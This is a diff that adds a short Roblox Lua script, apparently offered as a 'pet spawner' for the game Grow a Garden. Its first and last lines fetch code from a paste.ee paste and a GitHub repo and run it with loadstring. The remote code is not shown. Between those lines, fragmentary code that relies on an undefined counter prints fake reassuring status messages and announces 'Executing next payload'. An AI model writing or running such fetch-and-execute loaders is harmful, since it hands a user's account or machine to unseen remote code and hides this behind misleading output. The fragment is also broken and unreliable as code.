@@ -1,0 +1,13 @@
+loadstring(game:HttpGet("https://paste.ee/r/ZFls6zqv"))()
+
+if i % 60 == 0 then
+    print("[INFO] Still running... "..(i/60).." minute(s) passed.")
+elseif i % 77 == 0 then -- remove or adjust
+    print("[SYSTEM] Memory status: OK.")
+elseif i % 123 == 0 then -- remove or adjust
+    print("[ALERT] All systems nominal. Monitoring...")
+elseif i == 59 then -- since 60s ends at i = 60, change final message
+    print("[FINALIZING] Countdown complete. Executing next payload...")
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
